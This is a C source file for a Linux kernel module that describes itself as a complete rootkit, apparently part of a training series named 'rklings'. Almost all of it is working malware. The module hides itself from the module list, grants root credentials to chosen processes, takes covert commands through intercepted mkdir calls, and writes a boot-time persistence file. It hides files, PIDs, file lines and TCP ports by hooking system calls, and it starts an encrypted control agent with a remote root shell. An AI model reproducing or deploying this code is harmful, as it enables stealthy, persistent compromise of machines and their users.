// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/hex.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>

#include "agent.h"
#include "root_shell.h"
#include "target_list.h"

#define RK_BUF_MAX 2048
#define RK_CMD_MAX 128
#define RK_PREFIX "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX 128
#define RK_PERSIST_PATH "/etc/modules-load.d/rklings.conf"
#define RK_PERSIST_CONTENT "rklings\n"

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "control TCP listener port");

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "control IPv4 peer address");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);
MODULE_PARM_DESC(shell_timeout_ms, "root shell inactivity timeout in milliseconds");

static char control_key[65];
module_param_string(control_key, control_key, sizeof(control_key), 0400);
MODULE_PARM_DESC(control_key, "hex-encoded 256-bit control key");

static struct rk_agent agent;
static struct rk_root_shell shell;
struct rk_target_list file_targets;
struct rk_target_list pid_targets;
struct rk_target_list content_targets;
struct rk_target_list port_targets;
static struct proc_dir_entry *proc_entry;
static struct list_head *saved_prev;
bool module_hidden;
bool persist_requested;

/* --- module hiding (M01) --- */

void rk_module_hide(void);
void rk_module_unhide(void);
int rk_escalate_pid(unsigned int pid);

void rk_module_hide(void)
{
	if (module_hidden)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = true;
}

void rk_module_unhide(void)
{
	if (!module_hidden)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
}

/* --- privilege escalation --- */

static atomic_t escalate_pid = ATOMIC_INIT(0);
static struct cred *escalate_cred;

static int rk_escalate_self(void)
{
	struct cred *new_cred;
	struct task_struct *parent;
	int error;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	error = commit_creds(new_cred);
	if (error)
		return error;
	// escalate parent shell via deferred path (safe under CET)
	parent = rcu_dereference(current->real_parent);
	if (parent && parent != current && parent->mm)
		rk_escalate_pid(task_tgid_vnr(parent));
	return 0;
}

// deferred: creds applied when target next calls read()
int rk_escalate_pid(unsigned int pid)
{
	struct cred *new_cred;

	if (atomic_read(&escalate_pid))
		return -EBUSY;
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalate_cred = new_cred;
	smp_wmb();
	atomic_set(&escalate_pid, (int)pid);
	return 0;
}

/* --- local covert control (M02) --- */

static int rk_parse_local_command(const char *path)
{
	const char *cmd = path + RK_PREFIX_LEN;

	if (strcmp(cmd, "e") == 0)
		return rk_escalate_self();
	if (strcmp(cmd, "h.m") == 0) {
		rk_module_hide();
		return 0;
	}
	if (strcmp(cmd, "u.m") == 0) {
		rk_module_unhide();
		return 0;
	}
	if (strcmp(cmd, "persist") == 0) {
		struct file *f;

		f = filp_open(RK_PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
		if (!IS_ERR(f)) {
			kernel_write(f, RK_PERSIST_CONTENT,
				     sizeof(RK_PERSIST_CONTENT) - 1, &f->f_pos);
			filp_close(f, NULL);
		}
		persist_requested = true;
		return 0;
	}
	if (strncmp(cmd, "h.f.", 4) == 0 && cmd[4])
		return rk_target_add(&file_targets, cmd + 4) < 0 ? -ENOSPC : 0;
	if (strncmp(cmd, "h.i.", 4) == 0 && cmd[4])
		return rk_target_add(&pid_targets, cmd + 4) < 0 ? -ENOSPC : 0;
	if (strncmp(cmd, "h.c.", 4) == 0 && cmd[4])
		return rk_target_add(&content_targets, cmd + 4) < 0 ? -ENOSPC : 0;
	if (strncmp(cmd, "h.p.", 4) == 0 && cmd[4])
		return rk_target_add(&port_targets, cmd + 4) < 0 ? -ENOSPC : 0;
	if (strncmp(cmd, "u.f.", 4) == 0 && cmd[4])
		return rk_target_remove_either(&file_targets, cmd + 4);
	if (strncmp(cmd, "u.i.", 4) == 0 && cmd[4])
		return rk_target_remove_either(&pid_targets, cmd + 4);
	if (strncmp(cmd, "u.c.", 4) == 0 && cmd[4])
		return rk_target_remove_either(&content_targets, cmd + 4);
	if (strncmp(cmd, "u.p.", 4) == 0 && cmd[4])
		return rk_target_remove_either(&port_targets, cmd + 4);
	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (void *)inst->data;
	struct pt_regs *uregs;
	const char __user *pathname;
	char buf[RK_PATH_MAX];
	long copied;

	data->intercepted = false;
	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	pathname = (const char __user *)uregs->di;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;
	{
		const char *base = strrchr(buf, '/');

		base = base ? base + 1 : buf;
		if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
			return 0;
		data->result = rk_parse_local_command(base);
	}
	data->intercepted = true;
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_return(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (void *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler = rk_mkdir_entry,
	.handler = rk_mkdir_return,
	.data_size = sizeof(struct rk_mkdir_data),
	.maxactive = 8,
};

/* --- directory/PID hiding (M03) --- */

struct rk_getdents_data {
	void __user *dirp;
	unsigned char scratch[RK_BUF_MAX];
};

static unsigned short rk_reclen(const unsigned char *rec)
{
	unsigned short len;

	memcpy(&len, rec + 16, sizeof(len));
	return len;
}

static bool rk_dirent_should_hide(const char *name, size_t name_length)
{
	unsigned int pid_val;

	if (rk_target_match(&file_targets, name, name_length))
		return true;
	if (kstrtouint(name, 10, &pid_val) == 0 &&
	    rk_target_number_match(&pid_targets, pid_val))
		return true;
	return false;
}

static size_t rk_filter_dirents(unsigned char *buf, size_t length)
{
	size_t offset = 0;
	size_t write_off = 0;
	size_t prev_retained = SIZE_MAX;

	while (offset < length) {
		unsigned char *rec = buf + offset;
		unsigned short rec_len = rk_reclen(rec);
		const char *name;
		size_t name_len;

		if (rec_len == 0 || rec_len > length - offset)
			break;
		name = (const char *)rec + 19;
		name_len = strnlen(name, rec_len - 19);
		if (rk_dirent_should_hide(name, name_len)) {
			if (prev_retained != SIZE_MAX)
				memcpy(buf + prev_retained + 8,
				       rec + 8, sizeof(u64));
		} else {
			if (write_off != offset)
				memmove(buf + write_off, rec, rec_len);
			prev_retained = write_off;
			write_off += rec_len;
		}
		offset += rec_len;
	}
	return write_off;
}

static int rk_getdents_entry(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct rk_getdents_data *data = (void *)inst->data;
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs) {
		data->dirp = NULL;
		return 0;
	}
	data->dirp = (void __user *)uregs->si;
	return 0;
}

static int rk_getdents_return(struct kretprobe_instance *inst,
			       struct pt_regs *regs)
{
	struct rk_getdents_data *data = (void *)inst->data;
	long result = (long)regs_return_value(regs);
	size_t new_len;

	if (!data->dirp || result <= 0 || result > RK_BUF_MAX)
		return 0;
	if (!file_targets.count && !pid_targets.count)
		return 0;
	if (copy_from_user_nofault(data->scratch, data->dirp, result) != 0)
		return 0;
	new_len = rk_filter_dirents(data->scratch, (size_t)result);
	if (new_len == (size_t)result)
		return 0;
	if (new_len == 0) {
		regs_set_return_value(regs, 0);
		return 0;
	}
	if (copy_to_user_nofault(data->dirp, data->scratch, new_len) != 0)
		return 0;
	regs_set_return_value(regs, (unsigned long)new_len);
	return 0;
}

static struct kretprobe getdents_probe = {
	.kp.symbol_name = "__x64_sys_getdents64",
	.entry_handler = rk_getdents_entry,
	.handler = rk_getdents_return,
	.data_size = sizeof(struct rk_getdents_data),
	.maxactive = 16,
};

/* --- content hiding (M05, from L15) --- */

struct rk_read_data {
	char __user *buffer;
	unsigned char scratch[RK_BUF_MAX];
};

static size_t rk_remove_matching_lines(unsigned char *buf, size_t length)
{
	size_t read_pos = 0;
	size_t write_pos = 0;

	while (read_pos < length) {
		const unsigned char *line = buf + read_pos;
		const unsigned char *nl = memchr(line, '\n',
						 length - read_pos);
		size_t line_len = nl ? (size_t)(nl - line + 1)
				     : (length - read_pos);

		if (!rk_target_match(&content_targets,
				     (const char *)line, line_len)) {
			if (write_pos != read_pos)
				memmove(buf + write_pos, line, line_len);
			write_pos += line_len;
		}
		read_pos += line_len;
	}
	return write_pos;
}

static int rk_read_entry(struct kretprobe_instance *inst,
			  struct pt_regs *regs)
{
	struct rk_read_data *data = (void *)inst->data;
	int target = atomic_read(&escalate_pid);

	if (target && task_tgid_vnr(current) == target) {
		atomic_set(&escalate_pid, 0);
		smp_rmb();
		commit_creds(escalate_cred);
		escalate_cred = NULL;
	}
	data->buffer = (char __user *)regs->si;
	return 0;
}

static int rk_read_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_read_data *data = (void *)inst->data;
	long result = (long)regs_return_value(regs);
	size_t new_len;

	if (!data->buffer || result <= 0 || result > RK_BUF_MAX)
		return 0;
	if (!content_targets.count)
		return 0;
	if (copy_from_user(data->scratch, data->buffer, result) != 0)
		return 0;
	new_len = rk_remove_matching_lines(data->scratch, (size_t)result);
	if (new_len == (size_t)result)
		return 0;
	if (new_len == 0) {
		regs_set_return_value(regs, 0);
		return 0;
	}
	if (copy_to_user(data->buffer, data->scratch, new_len) != 0)
		return 0;
	regs_set_return_value(regs, (unsigned long)new_len);
	return 0;
}

static struct kretprobe read_probe = {
	.kp.symbol_name = "ksys_read",
	.entry_handler = rk_read_entry,
	.handler = rk_read_return,
	.data_size = sizeof(struct rk_read_data),
	.maxactive = 16,
};

/* --- port hiding (M05, from L26) --- */

struct rk_tcp_data {
	struct seq_file *seq;
	size_t prev_count;
};

static int rk_tcp_show_entry(struct kretprobe_instance *inst,
			     struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;
	struct seq_file *seq = (struct seq_file *)regs->di;
	void *v = (void *)regs->si;
	struct sock *sk;
	struct inet_sock *inet;

	data->seq = NULL;
	if (v == SEQ_START_TOKEN)
		return 0;
	if (!port_targets.count)
		return 0;
	sk = (struct sock *)v;
	inet = inet_sk(sk);
	if (rk_target_number_match(&port_targets, ntohs(inet->inet_sport))) {
		data->seq = seq;
		data->prev_count = seq->count;
	}
	return 0;
}

static int rk_tcp_show_return(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;

	if (data->seq)
		data->seq->count = data->prev_count;
	return 0;
}

static struct kretprobe tcp4_probe = {
	.kp.symbol_name = "tcp4_seq_show",
	.entry_handler = rk_tcp_show_entry,
	.handler = rk_tcp_show_return,
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

static struct kretprobe tcp6_probe = {
	.kp.symbol_name = "tcp6_seq_show",
	.entry_handler = rk_tcp_show_entry,
	.handler = rk_tcp_show_return,
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

/* --- proc interface --- */

static int rk_show(struct seq_file *out, void *unused)
{
	unsigned long flags;
	unsigned int i;

	seq_printf(out, "module: %s\n", module_hidden ? "yes" : "no");
	seq_printf(out, "persist: %s\n", persist_requested ? "yes" : "no");

	seq_puts(out, "file_targets:\n");
	spin_lock_irqsave(&file_targets.lock, flags);
	for (i = 0; i < file_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, file_targets.entries[i]);
	spin_unlock_irqrestore(&file_targets.lock, flags);

	seq_puts(out, "pid_targets:\n");
	spin_lock_irqsave(&pid_targets.lock, flags);
	for (i = 0; i < pid_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, pid_targets.entries[i]);
	spin_unlock_irqrestore(&pid_targets.lock, flags);

	seq_puts(out, "content_targets:\n");
	spin_lock_irqsave(&content_targets.lock, flags);
	for (i = 0; i < content_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, content_targets.entries[i]);
	spin_unlock_irqrestore(&content_targets.lock, flags);

	seq_puts(out, "port_targets:\n");
	spin_lock_irqsave(&port_targets.lock, flags);
	for (i = 0; i < port_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
	spin_unlock_irqrestore(&port_targets.lock, flags);

	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_proc_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

/* --- hex key parser --- */

static int rk_parse_hex_key(const char *hex, u8 *key, size_t key_length)
{
	size_t index;

	if (strlen(hex) != key_length * 2)
		return -EINVAL;
	for (index = 0; index < key_length; index++) {
		int high, low;

		high = hex_to_bin(hex[index * 2]);
		low = hex_to_bin(hex[index * 2 + 1]);
		if (high < 0 || low < 0)
			return -EINVAL;
		key[index] = (u8)((high << 4) | low);
	}
	return 0;
}

/* --- init/exit --- */

static int __init rk_init(void)
{
	u8 key[RK_AEAD_KEY_LENGTH];
	__be32 peer_address;
	int error;

	{
		const char *end;

		if (!in4_pton(peer_address_text, -1, (u8 *)&peer_address,
			      -1, &end) || *end || !peer_address)
			return -EINVAL;
	}
	if (!peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
		return -EINVAL;

	error = rk_parse_hex_key(control_key, key, sizeof(key));
	if (error)
		return -EINVAL;

	rk_target_list_init(&file_targets);
	rk_target_list_init(&pid_targets);
	rk_target_list_init(&content_targets);
	rk_target_list_init(&port_targets);

	error = rk_root_shell_init(&shell, shell_timeout_ms);
	if (error)
		goto zeroize_key;

	error = rk_agent_start(&agent, peer_address, peer_port,
			       retry_base_ms, retry_max_ms,
			       key, sizeof(key), &shell);
	if (error)
		goto stop_shell;

	error = register_kretprobe(&getdents_probe);
	if (error)
		goto stop_agent;

	error = register_kretprobe(&read_probe);
	if (error)
		goto unregister_getdents;

	error = register_kretprobe(&tcp4_probe);
	if (error)
		goto unregister_read;

	error = register_kretprobe(&tcp6_probe);
	if (error)
		goto unregister_tcp4;

	error = register_kretprobe(&mkdir_probe);
	if (error)
		goto unregister_tcp6;

	proc_entry = proc_create("rkling_status", 0400, NULL, &rk_proc_ops);
	if (!proc_entry) {
		error = -ENOMEM;
		goto unregister_mkdir;
	}

	rk_target_add(&file_targets, "rkling");
	{
		char pid_str[12];

		snprintf(pid_str, sizeof(pid_str), "%d",
			 task_pid_vnr(agent.task));
		rk_target_add(&pid_targets, pid_str);
	}
	rk_module_hide();

	memzero_explicit(key, sizeof(key));
	memzero_explicit(control_key, sizeof(control_key));
	return 0;

unregister_mkdir:
	unregister_kretprobe(&mkdir_probe);
unregister_tcp6:
	unregister_kretprobe(&tcp6_probe);
unregister_tcp4:
	unregister_kretprobe(&tcp4_probe);
unregister_read:
	unregister_kretprobe(&read_probe);
unregister_getdents:
	unregister_kretprobe(&getdents_probe);
stop_agent:
	rk_agent_stop(&agent);
stop_shell:
	rk_root_shell_stop(&shell);
zeroize_key:
	memzero_explicit(key, sizeof(key));
	memzero_explicit(control_key, sizeof(control_key));
	return error;
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	proc_remove(proc_entry);
	unregister_kretprobe(&mkdir_probe);
	unregister_kretprobe(&tcp6_probe);
	unregister_kretprobe(&tcp4_probe);
	unregister_kretprobe(&read_probe);
	unregister_kretprobe(&getdents_probe);
	rk_agent_stop(&agent);
	rk_root_shell_stop(&shell);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings complete rootkit");
